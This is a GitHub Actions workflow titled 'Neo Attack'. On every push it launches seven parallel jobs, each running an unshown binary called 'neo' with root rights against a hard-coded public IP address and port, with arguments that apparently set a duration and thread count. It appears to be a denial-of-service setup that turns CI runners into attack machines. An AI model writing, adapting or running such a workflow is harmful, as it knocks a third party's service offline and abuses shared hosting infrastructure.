name: Neo Attack
on: [push]

jobs:
  neo:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x neo
    - run: sudo ./neo 4.247.22.25 18364 180 999
